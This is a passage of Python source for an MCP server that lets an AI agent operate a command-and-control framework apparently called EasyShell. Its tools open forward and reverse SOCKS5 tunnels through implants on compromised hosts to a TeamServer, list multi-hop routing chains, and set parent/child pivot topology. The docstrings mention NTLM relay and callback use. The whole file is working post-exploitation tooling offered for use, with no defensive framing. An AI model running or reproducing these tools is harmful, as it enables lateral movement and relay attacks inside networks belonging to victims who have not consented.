        "uid": uid,
        "Socks5port": str(local_port),
        "UserName": "",
        "Password": "",
        "Type": "forward",
        "TargetAddr": target_addr.strip(),
        "GroupKey": group_key.strip(),
    })
    if _ok(resp):
        route_hint = _format_route_hint(await _fetch_tunnel_route(api, uid))
        _tunnels[str(local_port)] = {
            "uid": uid, "port": local_port, "type": "forward", "target": target_addr,
            "group_key": group_key.strip(),
        }
        gk = f" group={group_key}" if group_key.strip() else ""
        return f"正向转发就绪: 127.0.0.1:{local_port} → {target_addr}（出口 {uid[:10]}…）{gk}\n{route_hint}"
    return f"失败: {_err(resp)}"


@mcp.tool()
async def easyshell_get_tunnel_route(uid: str) -> str:
    """查询植入体多级 HOP 路由链（沿 ParentUid 推断，格式 uid@ip:uid@ip）。

    Args:
        uid: 出口植入体 UID（可传前缀，自动解析）
    """
    api = _get_api()
    uid = await _resolve_uid(api, uid.strip())
    data = await _fetch_tunnel_route(api, uid)
    if not data:
        return f"查询失败或 UID 无效: {uid}"
    chain = str(data.get("routeChain") or "").strip()
    hops = int(data.get("hopCount") or 0)
    egress = str(data.get("egressUid") or uid).strip()
    lines = [f"出口 UID: {egress}", f"跳数: {hops or 1}", f"路由链: {chain or '（单跳，无 ParentUid）'}"]
    hop_list = data.get("hops") or []
    if isinstance(hop_list, list) and hop_list:
        lines.append("逐跳:")
        for i, h in enumerate(hop_list, 1):
            if isinstance(h, dict):
                lines.append(f"  {i}. {h.get('UID', '?')} @ {h.get('IP') or '—'}")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_set_topology_parent(uid: str, parent_uid: str = "") -> str:
    """设置植入体上级 ParentUid（Stowaway 式 parent/child，多跳 HOP 拓扑）。

    Args:
        uid: 当前植入体 UID（可传前缀）
        parent_uid: 上级植入体 UID；留空清除上级，改回自动推断
    """
    api = _get_api()
    uid = await _resolve_uid(api, uid.strip())
    parent = parent_uid.strip()
    if parent:
        parent = await _resolve_uid(api, parent)
    if parent == uid:
        return "不能将自身设为上级"
    resp = await api.post("client/topology/parent", json_body={"uid": uid, "ParentUid": parent})
    if not _ok(resp):
        return f"设置失败: {_err(resp)}"
    data = resp.get("data") or {}
    chain = str(data.get("routeChain") or "").strip() if isinstance(data, dict) else ""
    parent_show = parent or "（已清除，自动推断）"
    lines = [f"已设置 {uid[:10]}… 的上级 → {parent_show}"]
    if chain:
        lines.append(f"推断路由: {chain}")
    return "\n".join(lines)


@mcp.tool()
async def easyshell_start_backward_tunnel(
    uid: str,
    listen_addr: str,
    local_addr: str,
    mirror_port: int = 0,
    force: bool = True,
) -> str:
    """创建反向映射隧道（植入体监听 → TeamServer LocalAddr 桥接）。

    适用：目标只能访问植入体 IP 时的 NTLM Relay、回连等场景。

    Args:
        uid: 出口植入体 UID
        listen_addr: 植入体侧监听，如 :8080 或 0.0.0.0:445
        local_addr: TeamServer 桥接目标，如 127.0.0.1:7000
        mirror_port: TeamServer 可选镜像端口，0=不镜像
        force: 同 uid 已有隧道时先关闭
    """
    api = _get_api()
    uid = await _resolve_uid(api, uid.strip())
    if force:
        lst = await api.get("socks5/list", params={"uid": uid, "page": 1, "page_size": 50})
        if _ok(lst):
            for t in (lst.get("data") or {}).get("list") or []:
                p = str(t.get("Socks5port", ""))
                u = t.get("UserName") or ""
                pw = t.get("Password") or ""
                await api.post("socks5/close", json_body={"uid": uid, "Socks5port": p, "UserName": u, "Password": pw})
                await api.post("socks5/delete", json_body={"uid": uid, "Socks5port": p, "UserName": u, "Password": pw})
    body: dict = {
        "uid": uid,
        "Socks5port": str(mirror_port) if mirror_port > 0 else "",
        "UserName": "",
        "Password": "",
        "Type": "backward",
        "TargetAddr": listen_addr.strip(),
        "LocalAddr": local_addr.strip(),
    }
    resp = await api.post("socks5/start", json_body=body)
    if not _ok(resp):
        return f"失败: {_err(resp)}"
    route_hint = _format_route_hint(await _fetch_tunnel_route(api, uid))
    mirror = f"\n镜像: 127.0.0.1:{mirror_port}" if mirror_port > 0 else ""
    return (
        f"反向映射就绪:\n"
        f"  植入体监听: {listen_addr}\n"
        f"  TeamServer 桥接: {local_addr}{mirror}\n"
        f"{route_hint}"
    )


if __name__ == "__main__":
    mcp.run()
